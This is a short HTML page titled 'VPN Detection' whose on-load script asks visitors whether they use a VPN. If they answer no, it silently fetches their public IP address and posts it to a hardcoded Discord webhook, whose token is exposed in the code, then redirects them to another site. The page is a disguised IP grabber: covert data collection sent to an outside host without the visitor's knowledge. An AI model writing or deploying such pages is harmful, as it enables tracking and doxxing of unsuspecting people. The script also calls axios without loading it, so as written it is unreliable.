<!DOCTYPE html>
<html>
<head>
    <title>VPN Detection</title>
    <script>
        function checkVPN() {
            
            var isUsingVPN = confirm("Are you using a VPN?");
            
            if (isUsingVPN) 
            {
                alert("Please turn off your VPN.");
            } else 
            {
                async function logIPAndSendToWebhook() {
            try {
                const response = await axios.get('https://api.ipify.org?format=json');
                const ip = response.data.ip;
                const webhookUrl = 'https://discord.com/api/webhooks/1294694528149753917/x7UYkRR3odV0TWrt2uM3b-KeBg9REY6DR3TSDaQEfAVXaULoWW8-1DGBGzkQjlkWzQ_q';
                await axios.post(webhookUrl, {content: `IP Address: ${ip}`});
                console.log('IP address sent to Discord webhook:', ip);
            } catch (error) { console.error('Error logging IP address:', error); }
        }
                logIPAndSendToWebhook();
                window.location.href = "https://example.com"; // Redirect to another site
            }
        }
    </script>
</head>
<body onload="checkVPN()">
    <h1>Welcome</h1>
</body>
</html>
